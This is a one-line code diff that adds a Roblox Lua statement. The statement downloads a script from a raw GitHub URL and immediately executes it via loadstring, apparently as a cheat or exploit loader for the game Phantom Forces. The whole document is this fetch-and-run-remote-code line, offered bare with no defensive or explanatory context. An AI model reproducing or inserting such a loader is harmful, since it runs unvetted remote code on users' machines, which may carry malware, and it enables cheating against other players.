@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam4-c63mzwucl5d6f1.lua"))()
